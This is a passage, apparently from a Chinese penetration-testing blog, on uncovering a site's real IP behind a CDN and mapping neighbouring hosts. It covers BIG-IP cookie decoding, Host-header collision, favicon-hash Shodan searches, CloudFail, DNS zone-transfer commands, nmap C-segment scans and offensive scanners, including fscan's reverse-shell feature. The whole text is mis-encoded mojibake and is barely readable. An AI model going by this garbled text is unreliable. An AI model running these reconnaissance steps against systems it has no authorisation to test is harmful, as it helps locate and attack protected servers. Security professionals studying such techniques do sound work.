ä¸Šä¹Ÿå¯ä»¥æœç´¢å­åŸŸåï¼Œè¿æ°”å¥½çš„è¯ï¼Œä¼šæœ‰æ„æƒ³ä¸åˆ°çš„æ”¶è·ã€‚ é€šè¿‡å˜æ›´çš„åŸŸå å¾ˆå¤šç½‘ç«™åœ¨å‘å±•çš„è¿‡ç¨‹ä¸­ï¼Œä¼šæ›´æ¢åŸŸåï¼Œæ¯”å¦‚äº¬ä¸œä»¥å‰çš„åŸŸåæ˜¯ 360buy.com ï¼Œåæ¥æ–¥å·¨èµ„è´­ä¹°äº† jd.com ã€‚ ç½‘ç«™åœ¨æ›´æ¢æ–°åŸŸåæ—¶ï¼Œå¦‚æœå°† CDN éƒ¨ç½²åˆ°æ–°çš„åŸŸåä¸Šï¼Œè€Œä¹‹å‰çš„åŸŸåç”±äºæ²¡è¿‡æœŸï¼Œå¯èƒ½æœªä½¿ç”¨ CDNï¼Œå› æ­¤å¯ä»¥ç›´æ¥è·å¾—æœåŠ¡å™¨ IPï¼Œæ‰€ä»¥ï¼Œå†å²åŸŸåä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„ç‚¹ã€‚ é€šè¿‡ APP ç§»åŠ¨ç«¯åº”ç”¨ å¦‚æœç½‘ç«™å­˜åœ¨ APP ï¼Œå¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æå…¶ APP çš„æ•°æ®æµé‡ï¼Œçœ‹æ˜¯å¦èƒ½æ‰¾åˆ°ç½‘ç«™çœŸå® IP åœ°å€ï¼Œè®°å¾—å…³æ³¨ APP çš„å†å²ç‰ˆæœ¬ï¼Œé‡Œé¢ä¼šæœ‰å¾ˆå¤š surprise ã€‚ é€šè¿‡ F5 LTM è§£ç  LTM æ˜¯å°†æ‰€æœ‰çš„åº”ç”¨è¯·æ±‚åˆ†é…åˆ°å¤šä¸ªèŠ‚ç‚¹æœåŠ¡å™¨ä¸Šã€‚æé«˜ä¸šåŠ¡çš„å¤„ç†èƒ½åŠ›ï¼Œä¹Ÿå°±æ˜¯è´Ÿè½½å‡è¡¡ã€‚ å½“æœåŠ¡å™¨ä½¿ç”¨ F5 LTM åšè´Ÿè½½å‡è¡¡æ—¶ï¼Œé€šè¿‡å¯¹ set-cookie å…³é”®å­—çš„è§£ç ï¼Œå¯ä»¥è·å–æœåŠ¡å™¨çœŸå® ip åœ°å€ã€‚ ä¾‹å¦‚ï¼š Set-Cookie: BIGipServerpool_9.29_5229=605532106.22012.0000 å…ˆæŠŠç¬¬ä¸€å°èŠ‚çš„åè¿›åˆ¶æ•°ï¼Œå³ 605532106 å–å‡ºæ¥ å°†å…¶è½¬ä¸ºåå…­è¿›åˆ¶æ•° 2417afca æ¥ç€ä»åè‡³å‰ï¼Œå–å››ä¸ªå­—èŠ‚å‡ºæ¥ï¼š CA AF 17 24 æœ€åä¾æ¬¡è½¬ä¸ºåè¿›åˆ¶æ•° 202.175.23.36ï¼Œå³æ˜¯æœåŠ¡å™¨çš„çœŸå® ip åœ°å€ã€‚ é€šè¿‡å…¨ç½‘æ‰«æ é¦–å…ˆä» apnic ç½‘ç»œä¿¡æ¯ä¸­å¿ƒ æˆ– IPdeny è·å–ç›®æ ‡åœ°åŒº ip æ®µã€‚ æ¥ç€ä½¿ç”¨ Zmapã€masscan ç­‰å·¥å…·å¯¹æ‰«æå‡ºæ¥ç«¯å£å¼€æ”¾çš„ä¸»æœºè¿›è¡Œ banner çˆ¬å–ã€‚ ç„¶ååœ¨ http-req çš„ Host å­—æ®µï¼Œå†™å…¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾çš„å­åŸŸã€‚ æœ€åè¿‡æ»¤ç‰¹å¾ï¼Œç¡®è®¤æ˜¯å¦æœ‰å¯¹åº”çš„æœåŠ¡å™¨å“åº”ã€‚ å¦‚æœç«¯å£ä¸æ˜¯å¸¸è§æˆ–è€…å›ºå®šï¼Œå½“åœºé€€å½¹ã€‚ ç¼ºé™·ï¼šå®é™…ä¸Šï¼Œå…¨ç½‘æ‰«æçš„æ–¹æ³•ååˆ†ç¬¨é‡ï¼Œä¸æ¨èã€‚å› ä¸ºå·²ç»æœ‰å¾ˆå¤šçš„ç½‘ç«™ç»™æˆ‘ä»¬æä¾›äº†å…¨ç½‘çˆ¬å–æœåŠ¡ï¼Œä¹‹å‰çš„æ–¹æ³•é‡Œéƒ½æœ‰ä»‹ç»åˆ°ï¼Œä½•å¿…è‡ªå·±å…¨ç½‘æ‰«æå‘¢ï¼Œå—é™äºç½‘ç»œã€å—é™äºè®¾å¤‡ï¼Œä½ ä¸ªäººçˆ¬çš„æ•°æ®ä¹Ÿä¸ä¼šæœ‰äººå®¶å•†ä¸šçˆ¬çš„å…¨ é€šè¿‡ virtual-host ç¢°æ’ å½“æˆ‘ä»¬æ”¶é›†äº†ç›®æ ‡è¶³å¤Ÿå¤šçš„å¯èƒ½çš„çœŸå® IP æ—¶ï¼Œå¯ä»¥é€šè¿‡ IP å’Œå­åŸŸçš„ç¢°æ’ï¼Œæ¥æ‰¹é‡è·å¾—å‘½ä¸­ç›®æ ‡ä»¥åŠç›®æ ‡å“ªäº›çš„å­åŸŸã€‚ è¿™é‡Œå¯¹äºæˆ‘è¿™ä¸ªå°ç™½è¿˜ä¸æ‡‚ä»€ä¹ˆæ˜¯hostç¢°æ’ï¼Œé‚£æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ï¼š ä»€ä¹ˆæ˜¯HOSTSç¢°æ’ï¼š å½“ç›´æ¥è®¿é—®IPå›æ˜¾4xxé”™è¯¯ï¼Œç›´æ¥æŒ‡å®šHOSTå¤´ä¸ºæŸä¸ªåŸŸåæ—¶è®¿é—®è¯¥IPå›æ˜¾æ­£å¸¸æ—¶ï¼Œå¯åˆ¤æ–­å¯è¿›è¡ŒHOSTSç¢°æ’ã€‚ å½“ä¸€äº›åŸŸååªå…è®¸åœ¨å†…ç½‘è®¿é—®æ—¶ï¼Œå¯é€šè¿‡è¿™ç§ç¢°æ’ç›´æ¥çªç ´è¾¹ç•Œé™åˆ¶ï¼Œè®¿é—®åˆ°å†…ç½‘ç³»ç»Ÿè¿›è¡Œä¸‹ä¸€æ­¥æ¸—é€æµ‹è¯•ã€‚ æ¯”å¦‚å¦‚æœæ­¤æ—¶å¯¹æ–¹çš„ç½‘ç«™å¯¹åº”çš„ä¸­é—´ä»¶æœ‰å¦‚ä¸‹é…ç½® server { listen 80 default_server; server_name _; return 400; } server { listen 80; server_name www.tpaertest.com; location / { proxy_pass http://192.168.3.17:8003; proxy_redirect off; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; root html; index index.html index.html; } access_log logs/test.com.log; } ç¬¬ä¸€ä¸ªserverçš„æ„æ€æ˜¯ï¼Œç›‘å¬80ç«¯å£ï¼Œä¸”å¦‚æœæˆ‘ä»¬è®¿é—®çš„servernameä¸æ˜¯å…¶ä»–serverå—å„¿ï¼ˆä¹Ÿå°±æ˜¯è¿™é‡Œçš„ç¬¬äºŒä¸ªï¼‰é…ç½®çš„servernameï¼Œé‚£å°±è¿”å›400ã€‚è¿™é‡Œæˆ‘ä»¬ç¬¬äºŒä¸ªserverå—å„¿è®¾ç½®äº†servernameä¸ºæŒ‡å®šåŸŸåï¼Œä¹Ÿå°±æ˜¯å¦‚æœæˆ‘ä»¬åœ¨è®¿é—®è¯¥ç½‘ç«™çš„æ—¶å€™ä¸æ˜¯ç”¨æŒ‡å®šåŸŸåè®¿é—®çš„ï¼Œå°±ä¼šè¿”å›400ï¼ˆä¹Ÿå°±æ˜¯ç¦ç”¨IPè®¿é—®äº†ï¼‰ã€‚è¿™é‡Œæˆ‘ç»“åˆé‚£äº›æ–‡ç« ä¸¾ä¸ªä¾‹å­å§ï¼š æ¯”å¦‚æˆ‘ä»¬æ­¤æ—¶å¯¹ç›®æ ‡ç½‘ç«™è¿›è¡Œä¿¡æ¯æœé›†ä¹‹åï¼Œæœ‰äº†å¤§é‡çš„IPèµ„äº§ï¼Œå¹¶ä¸”è¿™äº›IPèµ„äº§ä¹Ÿå¼€å¯äº†webç«¯å£ï¼Œä½†å½“æˆ‘ä»¬ä½¿ç”¨IPç›´æ¥è®¿é—®çš„æ—¶å€™ä¼šå‘ç°æ€»æ˜¯è¿”å›400ã€403ã€404ç­‰ç­‰ã€‚è¿™åŸºæœ¬å°±æ˜¯å¯¹æ–¹çš„ä¸­é—´ä»¶ä½¿ç”¨äº†åå‘ä»£ç†ï¼Œç¦ç”¨äº†IPè®¿é—®ã€‚æ­¤æ—¶å‘¢ï¼Œå¯¹æ–¹ç½‘ç«™è®¾ç½®çš„æ˜¯ï¼šåªèƒ½ä½¿ç”¨å†…ç½‘åŸŸåæ¥è®¿é—®è¯¥ç½‘ç«™ã€‚ è€Œå¯¹äºå¤„äºå¤–ç½‘çš„æˆ‘ä»¬æ¥è®²ï¼Œå¦‚æœæˆ‘ä»¬æ‰¾åˆ°äº†è¯¥IPå¯¹åº”çš„çœŸæ­£åŸŸåï¼Œæ­¤æ—¶æˆ‘ä»¬å»è®¿é—®è¯¥åŸŸåçš„æ—¶å€™ä¹Ÿæ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸ºä»–æ˜¯å†…ç½‘åŸŸåï¼Œè€Œæˆ‘ä»¬åœ¨è®¿é—®çš„æ—¶å€™ï¼Œä¼šå»å…¬ç½‘DNSæœåŠ¡å™¨å»å¯»æ±‚åŸŸåå¯¹åº”è§£æå‡ºæ¥çš„IPï¼Œä½†å¾ˆæ˜æ˜¾æ˜¯æ‰¾ä¸åˆ°çš„ã€‚ åªæœ‰æˆ‘ä»¬åœ¨æœ¬åœ°hostsæ–‡ä»¶ä¸­è®¾ç½®IP-&gt;æ­£ç¡®åŸŸåçš„è§£æå…³ç³»ï¼Œè¿™æ—¶æˆ‘ä»¬å†å»è®¿é—®çš„æ—¶å€™å°±å¯ä»¥æˆåŠŸè®¿é—®ç›®æ ‡å†…ç½‘ç³»ç»Ÿã€‚å› ä¸ºæœ¬åœ°hostsçš„IPè§£æä¼˜å…ˆçº§é«˜äºå…¬å…±çš„DNSæœåŠ¡å™¨ã€‚ å…·ä½“å¯å‚è€ƒï¼šè¾¹ç•Œæ¸—é€ä¸­çš„å°æŠ€å·§-Hostsç¢°æ’ ã€åˆ©ç”¨HOSTSç¢°æ’çªç ´è¾¹ç•Œã€Hostç¢°æ’ç¯å¢ƒæ­å»ºåŸç†åŠå¤ç° å›åˆ°æ­£é¢˜ï¼Œé‚£æˆ‘ä»¬åœ¨é‡åˆ°ç±»ä¼¼æƒ…å†µå°±å¯ä»¥ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ¥å¿«é€Ÿæ˜ç¡®IPä¸åŸŸåçš„æ­£ç¡®ç»‘å®šå…³ç³»ï¼š è‡ªåŠ¨åŒ–çš„è¿‡ç¨‹å¯ä»¥ä½¿ç”¨ virtual-host-discovery å·¥å…·ï¼Œé¡¹ç›®åœ°å€ï¼šhttps://github.com/jobertabma/virtual-host-discovery ä½¿ç”¨æ–¹æ³•ï¼š $ ruby scan.rb --ip=x.x.x.x --host=domain --wordlist=&lt;dict file&gt; å…¶ä¸­wordlsit å‚æ•°å¯ä»¥çœç•¥ï¼Œé»˜è®¤æœ‰ä¸€ä¸ªå­—å…¸åŠ è½½ï¼Œä½¿ç”¨è¯¥å‚æ•°åˆ™æ˜¯æŒ‡å®šæˆ‘ä»¬è‡ªå·±æƒ³è¦è·‘çš„å­åŸŸåˆ—è¡¨ã€‚ æ‰§è¡Œåï¼Œå³å¯å¿«é€Ÿæ‰¾å‡ºå‘½ä¸­ IP çš„å­åŸŸï¼Œè¿™é‡Œæ”¾ä¸Šä¸€ä¸ªæˆæœå›¾ï¼ˆæœªå®è·µï¼‰ å¦å¤–å¯ä»¥é€šè¿‡ find-virtual-hosts ï¼ˆhttps://pentest-tools.com/information-gathering/find-virtual-hosts#ï¼‰å·¥å…·æ¥åœ¨çº¿å¿«é€Ÿé’ˆå¯¹å…¨ç½‘æ•°æ®æ‰«ææ¯”å¯¹å¾—å‡ºç»“æœï¼š é€šè¿‡ favicon.ico å“ˆå¸Œç‰¹å¾ favicon.ico æ˜¯ç°ä»£æµè§ˆå™¨åœ¨ç½‘é¡µæ ‡é¢˜çš„å·¦ä¾§æ˜¾ç¤ºçš„ä¸€ä¸ªå°å›¾æ ‡ã€‚ è¯¥å›¾æ ‡æ•°æ®é€šå¸¸æ˜¯ä» https://anywebsite/favicon.ico å¤„è·å–çš„ï¼Œæµè§ˆå™¨ä¼šåœ¨æµè§ˆä»»ä½•ç½‘ç«™æ—¶è‡ªåŠ¨è¯·æ±‚å®ƒã€‚ å› ä¸ºå¯ä»¥é€šè¿‡è®¡ç®— favicon.ico çš„æŒ‡çº¹å“ˆå¸Œï¼Œç„¶åå» shodan ç­‰æœç´¢å¼•æ“æœç´¢ä¸ä¹‹ç›¸åŒçš„ä¸»æœºç»“æœï¼Œä»è€Œè¿›ä¸€æ­¥æ¢æµ‹æ˜¯å¦èƒ½æŒ–æ˜å‡ºç›®æ ‡ç½‘ç«™çš„çœŸå® IP åœ°å€ã€‚ è®¡ç®— favicon.ico å“ˆå¸Œçš„å°è„šæœ¬ï¼š python 2 import mmh3 import requests response = requests.get('https://domain.com/favicon.ico') favicon = response.content.encode('base64') hash = mmh3.hash(favicon) print hash python 3 import mmh3 import requests import codecs response = requests.get('https://domain.com/favicon.ico') favicon = codecs.encode(response.content,\"base64\") hash = mmh3.hash(favicon) print(hash) å®‰è£…å¥½ç¯å¢ƒä¾èµ–åæ‰§è¡Œè„šæœ¬ï¼Œè®¡ç®—å¾—åˆ°ç›®æ ‡ç½‘ç«™çš„ favicon.ico å“ˆå¸Œå€¼ï¼š ç„¶åç”¨ shodan æœç´¢å¼•æ“æœç´¢å“ˆå¸Œï¼Œå»å‘½ä¸­ IPï¼š proxychains4 shodan search http.favicon.hash:1533180946 --fields ip_str,port --separator \" \" | awk '{print $1\":\"$2}' è¿™é‡Œä¸çŸ¥ä¸ºä½•è®¿é—®æ€»æ˜¯è¢«ç¦ï¼Œä½†åœ¨ç½‘ç«™ä¸Šè¿˜æ˜¯å¯ä»¥æ­£å¸¸è®¿é—®çš„ã€‚ã€‚ã€‚ã€‚ æ„Ÿè§‰æ˜¯api-keyçš„é—®é¢˜ï¼Œä½†ä¹Ÿæ²¡è§£å†³ï¼Œå…ˆæ”¾ç€å§ã€‚ã€‚ã€‚ é€šè¿‡ç½‘é¡µæºç ç‰¹å¾å€¼ åœ¨æœåŠ¡å™¨æº IP åœ°å€å…è®¸è®¿é—®å¹¶ä¸”è¿”å›çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„ç½‘ç«™å†…å®¹æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¾¦å¯Ÿé¡µé¢æºç ä¸­ JS ã€CSS ã€HTML ç­‰ä¸€ç³»åˆ—é™æ€ç‰¹å¾å€¼ï¼Œç„¶åç”¨ Shodan ã€Zoomeye ã€Censys ç­‰æœç´¢å¼•æ“è¿›è¡ŒåŒ¹é…æœç´¢ï¼Œä»è€Œå®šä½ IP ã€‚ ä¾‹å¦‚æºç ä¸­æ‰¾åˆ°ä¸€æ®µ Google Analytics çš„ JS ç‰¹å¾ï¼š è¿™é‡Œæˆ‘çš„æ‰¾çš„ç‰¹å¾å€¼ä¹Ÿä¸å¤Ÿæœ‰ç‰¹è‰²ï¼Œå¯ä»¥çœ‹åˆ°å›æ˜¾çš„ ä½¿ç”¨ CloudFair å·¥å…· å¦‚æœä½ çš„ç›®æ ‡æ˜¯ CloudFlare ä¿æŠ¤çš„ï¼Œå»ºè®®å…ˆä¸Šè¿™æ¬¾å·¥å…·è·‘ã€‚ CloudFail æ˜¯ä¸€ç§æˆ˜æœ¯ä¾¦å¯Ÿå·¥å…·ï¼Œæ—¨åœ¨æ”¶é›†æœ‰å…³å— Cloudflare ä¿æŠ¤çš„ç›®æ ‡çš„è¶³å¤Ÿä¿¡æ¯ï¼Œä»¥æœŸå‘ç°æœåŠ¡å™¨çš„ IP ä½ç½®ã€‚ è¯¥å·¥å…·ç›®å‰æ¢æµ‹ç»è¿‡3ä¸ªä¸åŒçš„æ”»å‡»é˜¶æ®µï¼š 1.ä½¿ç”¨ DNSDumpster.com æ‰«æ DNS é…ç½®é”™è¯¯ã€‚ 2.æ‰«æå’Œæ¯”å¯¹ Crimeflare.com æ•°æ®åº“ã€‚ 3.å†…ç½®å­—å…¸æš´åŠ›æ‰«æè¶…è¿‡11000ä¸ªå­åŸŸåã€‚ å®‰è£…å’Œä½¿ç”¨ï¼š git clone https://github.com/m0rtem/CloudFail pip install -r requirements.txt python cloudfail.py -t domain.com DNS åŸŸä¼ é€å‘ç°å­åŸŸå DNS æœåŠ¡å™¨åˆ†ä¸ºï¼šä¸»æœåŠ¡å™¨ã€å¤‡ä»½æœåŠ¡å™¨å’Œç¼“å­˜æœåŠ¡å™¨ã€‚åœ¨ä¸»å¤‡æœåŠ¡å™¨ä¹‹é—´åŒæ­¥æ•°æ®åº“ï¼Œéœ€è¦ä½¿ç”¨ â€œDNS åŸŸä¼ é€â€ã€‚åŸŸä¼ é€æ˜¯æŒ‡å¤‡ä»½æœåŠ¡å™¨ä»ä¸»æœåŠ¡å™¨æ‹·è´æ•°æ®ï¼Œå¹¶ç”¨å¾—åˆ°çš„æ•°æ®æ›´æ–°è‡ªèº«æ•°æ®åº“ã€‚ è‹¥ DNS æœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´æ”»å‡»è€…è·å–æŸä¸ªåŸŸçš„æ‰€æœ‰è®°å½•ã€‚é€ æˆæ•´ä¸ªç½‘ç»œçš„æ‹“æ‰‘ç»“æ„æ³„éœ²ç»™æ½œåœ¨çš„æ”»å‡»è€…ï¼ŒåŒ…æ‹¬ä¸€äº›å®‰å…¨æ€§è¾ƒä½çš„å†…éƒ¨ä¸»æœºï¼Œå¦‚æµ‹è¯•æœåŠ¡å™¨ã€‚åŒæ—¶ï¼Œé»‘å®¢å¯ä»¥å¿«é€Ÿçš„åˆ¤å®šå‡ºæŸä¸ªç‰¹å®š zone çš„æ‰€æœ‰ä¸»æœºï¼Œæ”¶é›†åŸŸä¿¡æ¯ï¼Œé€‰æ‹©æ”»å‡»ç›®æ ‡ï¼Œæ‰¾å‡ºæœªä½¿ç”¨çš„ IP åœ°å€ï¼Œç»•è¿‡åŸºäºç½‘ç»œçš„è®¿é—®æ§åˆ¶ã€‚ç›®å‰æ¥çœ‹ â€œDNS åŸŸä¼ é€æ¼æ´â€ å·²ç»å¾ˆå°‘äº†ã€‚ åˆ©ç”¨ nmap æ¼æ´æ£€æµ‹è„šæœ¬ dns-zone-transfer è¿›è¡Œæ£€æµ‹ nmap&nbsp;--script&nbsp;dns-zone-transfer&nbsp;--script-args&nbsp;dns-zone-transfer.domain=xxx.edu.cn&nbsp;-p&nbsp;53&nbsp;-Pn&nbsp;dns.xxx.edu.cn Linux digå‘½ä»¤è¿›è¡Œæµ‹è¯• dig xxx.com nsdig axfr @dns xxx.com æœ€åè®°å‡ ä¸ªæœªèƒ½å®è·µä½†å´å€¼å¾—è®°å½•çš„å‡ ä¸ªæ–¹æ³•ï¼ˆä¸‡ä¸€æ—¥åç”¨ä¸Šå‘¢ï¼‰ é€šè¿‡ CDN æ ‡å¤´ç‰¹å¾å€¼â€“censysæœç´¢ é€šè¿‡ XML-RPC PINGBACK é€šä¿¡ â€”â€”ä¼¼ä¹æ˜¯é’ˆå¯¹æ”¯æŒ WordPress çš„ç½‘ç«™çš„æ–¹æ³• é€šè¿‡ FTP/SCP åè®® åˆ©ç”¨ Websocket åè®®â€”â€”é’ˆå¯¹é‚£äº›æ²¡æœ‰é’ˆå¯¹websocketè¿›è¡Œéƒ¨ç½²çš„ç½‘ç«™ ç¤¾ä¼šå·¥ç¨‹å­¦â€”â€”ç¤¾å·¥çš„é­…åŠ› é€šè¿‡å…¨ç½‘æ‰«æ é€šè¿‡ç½‘ç«™è¿œç¨‹èµ„æºä¸šåŠ¡ â€”â€”æ³¨å…¥æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨èµ„æºæ–‡ä»¶ï¼Œçœ‹httpæ—¥å¿— é€šè¿‡CDNæœºå™¨ â€”â€”å¯¹äºè‡ªæ­å»ºCDNçš„ç½‘ç«™ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ¸—é€ä¸€äº›é˜²æŠ¤å¼±çš„CDNæœºå™¨ é€šè¿‡æµé‡è€—å°½ã€æµé‡æ”¾å¤§æ”»å‡» â€”â€”åˆ©ç”¨CDNæµé‡æœ‰é™çš„ç‰¹ç‚¹æ¥è¿›è¡Œddos é€šè¿‡åŸŸåå¤‡æ¡ˆä¿¡æ¯å¹¿åŸŸæ¢æµ‹â€”â€”å°è¯•å¯»æ‰¾æ²¡æœ‰åšCDNçš„è¾¹ç¼˜å­åŸŸ åˆ©ç”¨CDN æœåŠ¡å•†é»˜è®¤é…ç½® â€”â€”CloudFlare ï¼Œé»˜è®¤é…ç½® direct.domain.com äºŒçº§å­åŸŸæŒ‡å‘æœåŠ¡å™¨æº IP IPæ®µçš„æ”¶é›† ä¸€èˆ¬IPçš„è¯ï¼Œæˆ‘ä»¬åœ¨æ”¶é›†å­åŸŸåçš„æ—¶å€™ï¼Œå°±å¤§æ¦‚çŸ¥é“ç›®æ ‡ç½‘ç«™çš„IPæ®µäº†ã€‚ ä¹Ÿå¯ä»¥é€šè¿‡whoiså‘½ä»¤è·å–ã€‚å³é€šè¿‡ä¸­å›½äº’è”ç½‘ä¿¡æ¯ä¸­å¿ƒhttp://ipwhois.cnnic.net.cn/è¿›è¡ŒæŸ¥è¯¢ï¼š Cæ®µä¸æ—ç«™æŸ¥è¯¢ C æ®µï¼šæ˜¯æŒ‡ä¸ç›®æ ‡æœåŠ¡å™¨åœ¨åŒä¸€ C æ®µç½‘ç»œçš„æœåŠ¡å™¨ã€‚æ”»å‡»ç›®æ ‡çš„ C æ®µå­˜æ´»ä¸»æœºæ˜¯ä¿¡æ¯æ”¶é›†çš„é‡è¦æ­¥éª¤ï¼Œå¾ˆå¤šä¼ä¸šçš„å†…éƒ¨æœåŠ¡å™¨å¯èƒ½éƒ½ä¼šåœ¨ä¸€ä¸ª C æ®µç½‘ç»œä¸­ã€‚åœ¨å¾ˆéš¾æ‰¾åˆ°æ”»å‡»ç›®æ ‡æœåŠ¡å™¨äº’è”ç½‘æ¼æ´çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡æ”»å‡» C æ®µä¸»æœºï¼Œè·å–å¯¹ C æ®µä¸»æœºçš„æ§åˆ¶æƒï¼Œè¿›å…¥ä¼ä¸šå†…ç½‘ï¼Œåœ¨ä¼ä¸šçš„å†…ç½‘å®‰å…¨éš”ç¦»åŠå®‰å…¨é˜²æŠ¤ä¸å¦‚äº’è”ç½‘é˜²æŠ¤å¥å…¨çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ C æ®µçš„ä¸»æœºè¿›è¡Œå†…ç½‘æ¸—é€ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡äº’è”ç½‘çš„é˜²æŠ¤ï¼Œå¯¹ç›®æ ‡è¿›è¡Œæ”»å‡»ã€‚ä½†æ˜¯è¿™ç§æ”»å‡»æ–¹å¼å®¹æ˜“æ‰“åã€‚ æ—ç«™ï¼šæ˜¯å’Œç›®æ ‡ç½‘ç«™åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šçš„å…¶å®ƒçš„ç½‘ç«™ã€‚ Nmapæ‰«æ ä½¿ç”¨å‘½ä»¤ nmap -sn x.x.x.x/24ï¼Œå¯¹ç›®æ ‡ IP çš„ C æ®µä¸»æœºè¿›è¡Œå­˜æ´»æ‰«æï¼Œæ ¹æ®æ‰«æçš„ç»“æœå¯ä»¥åˆ¤æ–­ç›®æ ‡ IP çš„ C æ®µè¿˜æœ‰å“ªäº›ä¸»æœºå­˜æ´»ã€‚ nmap -Pn è¿™ä¸ªå‘½ä»¤åœ¨å®é™…å·¥ä½œä¸­çš„ä½¿ç”¨å¾ˆå¤šï¼Œè¯¥å‘½ä»¤ä¸é€šè¿‡ ICMP åè®®è¿›è¡Œä¸»æœºå­˜æ´»åˆ¤æ–­ï¼Œä¼šç›´æ¥å¯¹ç«¯å£è¿›è¡Œæ‰«æã€‚è¿™æ ·åœ¨å¼€å¯äº†é˜²ç«å¢™ç¦ Ping çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸ªå‘½ä»¤æ­£å¸¸æ‰«æç›®æ ‡æ˜¯å¦å­˜æ´»åŠå¯¹å¤–å¼€å¯çš„ç›¸å…³æœåŠ¡ã€‚ æœç´¢å¼•æ“è¯­æ³• Googleï¼šsite:x.x.x.* Bing.comï¼Œè¯­æ³•ä¸ºï¼šhttp://cn.bing.com/search?q=ip:111.111.111.111 Fofaï¼šip=\"x.x.x.x/24\" æŸ¥æ—ç«™ï¼šhttps://chapangzhan.com/ äº‘æ‚‰ï¼šhttps://www.yunsee.cn/ K8å·¥å…·ã€gobyã€å¾¡å‰‘ã€åŒ—æç†Šæ‰«æå™¨ç­‰ ç«™é•¿ä¹‹å®¶ï¼šhttp://s.tool.chinaz.com/same åœ¨çº¿ï¼šhttp://www.webscan.cc/ http://www.webscan.cc/ nmapæ‰«æ nmap -p 80,8080 --open ip/24 è¿™é‡Œä¸€å…±æ˜¯æ‰«æå‡º256çš„å­˜æ´»çš„ipã€‚ httpscan é¡¹ç›®åœ°å€ï¼š https://github.com/zer0h/httpscan bufferfly é¡¹ç›®åœ°å€ï¼šhttps://github.com/dr0op/bufferfly æ”»é˜²èµ„äº§å¤„ç†å°å·¥å…·ï¼Œå¯¹æ”»é˜²å‰çš„ä¿¡æ¯æœé›†åˆ°çš„å¤§æ‰¹é‡èµ„äº§/åŸŸåè¿›è¡Œå­˜æ´»æ£€æµ‹ã€è·å–æ ‡é¢˜å¤´ã€è¯­æ–™æå–ã€å¸¸è§webç«¯å£æ£€æµ‹ã€ç®€å•ä¸­é—´è¯†åˆ«ï¼Œå»é‡ç­‰ï¼Œä¾¿äºç­›é€‰æœ‰ä»·å€¼èµ„äº§ã€‚â€”â€”ä¸‹é¢é™„ä¸Šä¸€ä¸ªæˆæœå±•ç¤ºå›¾ï¼š cscan é¡¹ç›®åœ°å€ï¼šhttps://github.com/z1un/cscan ä¸httpscanå¾ˆåƒï¼Œä¸è¿‡è¿™æ˜¯py3çš„ï¼Œä½†æ•ˆæœæ„Ÿè§‰ä¸å¦‚http masscan é¡¹ç›®åœ°å€ï¼šhttps://github.com/robertdavidgraham/masscan ä¸nmapç±»ä¼¼ï¼Œä¸€ä¸ªå¼ºå¤§çš„ç«¯å£æ‰«æå·¥å…·ã€‚ä¼˜åŠ¿åœ¨äºé€Ÿåº¦å¿«ï¼Œç¼ºç‚¹æ˜¯è¯¯æŠ¥ç‡ä¹Ÿé«˜ fscan é¡¹ç›®åœ°å€ï¼šhttps://github.com/shadow1ng/fscan â€”â€”æ‰«æé€Ÿåº¦å¿«ï¼Œæ”¯æŒæ¼æ´éªŒè¯ ä¸€æ¬¾å†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ‰«æ‰«æã€‚ æ”¯æŒä¸»æœºå­˜æ´»æ¢æµ‹ã€ç«¯å£æ‰«æã€å¸¸è§æœåŠ¡çš„çˆ†ç ´ã€ms17010ã€redisæ‰¹é‡å†™å…¬é’¥ã€è®¡åˆ’ä»»åŠ¡åå¼¹shellã€è¯»å–winç½‘å¡ä¿¡æ¯ã€webæŒ‡çº¹è¯†åˆ«ã€webæ¼æ´æ‰«æã€netbiosæ¢æµ‹ã€åŸŸæ§è¯†åˆ«ç­‰åŠŸèƒ½ã€‚ shuize é¡¹ç›®åœ°å€ï¼šhttps://github.com/0x727/ShuiZe_0x727 æ°´æ³½è‡ªå¸¦èµ„äº§æ¢æ´»ã€æ”¯æŒæ¼æ´éªŒè¯ã€Hostç¢°æ’ ALLiN é¡¹ç›®åœ°å€ï¼šhttps://github.com/P1-Team/AlliN ä¸€ä¸ªè¾…åŠ©å¹³å¸¸æ¸—é€æµ‹è¯•é¡¹ç›®æˆ–è€…æ”»é˜²é¡¹ç›®å¿«é€Ÿæ‰“ç‚¹çš„ç»¼åˆå·¥å…·ï¼Œç”±ä¹‹å‰å†™çš„å·¥å…·AG3æ”¹åè€Œæ¥ã€‚æ˜¯ä¸€æ¬¾è½»ä¾¿ã€å°å·§ã€å¿«é€Ÿã€å…¨é¢çš„æ‰«æå·¥å…·ã€‚å¤šç”¨äºæ¸—é€å‰èµ„äº§æ”¶é›†å’Œæ¸—é€åå†…ç½‘æ¨ªå‘æ¸—é€ã€‚å·¥å…·ä»é¡¹ç›®ä¸Šè¿­ä»£äº†ä¸€äº›æ‡’äººåŠŸèƒ½ï¼ˆæ¯”å¦‚æä¾›æ‰«æèµ„äº§æ–‡ä»¶ä¸­ï¼Œå¯ä»¥å†™ç»å¤§éƒ¨åˆ†çš„å„ç§å½¢å¼çš„é“¾æ¥/CIDR,å¹¶åœ¨æ­¤åŸºç¡€ä¸Šå¯ä»¥æ·»åŠ ä»»æ„ç«¯å£å’Œè·¯å¾„ï¼‰ 